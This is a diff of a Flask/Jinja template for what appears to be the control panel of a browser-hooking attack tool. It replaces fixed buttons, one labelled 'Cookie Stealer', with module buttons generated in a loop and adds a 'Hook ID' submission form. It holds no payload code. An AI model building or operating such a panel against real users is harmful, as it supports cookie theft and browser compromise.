@@ -5,27 +5,26 @@
 {% block body %}
 <div class="container mt-5">
   <h1 class="module-title">Module Control Panel</h1>
+  {% for row in modules|dictsort(false)|batch(3) %}
+  {% set outer_loop = loop %}
   <div class="row mt-4">
+    {% for key, value in row %}
+    {% set sum_loop_index = outer_loop.index * 3 + loop.index0 %}
     <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-primary btn-lg btn-rectangle btn-block">Browser Plugins</button>
+      <button type="button" class="btn btn-dark btn-lg btn-rectangle btn-block module-button" style="background-color: {{ sum_loop_index | color_from_index }};" data-module="{{ key }}">{{ value }}</button>
     </div>
-    <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-secondary btn-lg btn-rectangle btn-block">Cookie Stealer</button>
-    </div>
-    <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-success btn-lg btn-rectangle btn-block">Language</button>
-    </div>
+    {% endfor %}
   </div>
-  <div class="row mt-4">
-    <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-danger btn-lg btn-rectangle btn-block">Screen Resolution</button>
-    </div>
-    <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-warning btn-lg btn-rectangle btn-block">Timezone</button>
-    </div>
-    <div class="col-md-4 mb-3">
-      <button type="button" class="btn btn-info btn-lg btn-rectangle btn-block">Button 6</button>
-    </div>
-  </div>
+  {% endfor %}
 </div>
+<div class="id-form mt-4 text-center">
+  <form id="hook-form" method="POST" class="d-inline-block">
+    <div class="form-group">
+      <label for="hook_id">Hook ID:</label>
+      <input type="text" id="hook_id" name="hook_id" class="form-control">
+    </div>
+    <button type="submit" class="btn btn-success mt-2">Submit</button>
+  </form>
+</div>
+<script src="{{ url_for('static', filename='scripts/module_control.js') }}"></script>
 {% endblock %}
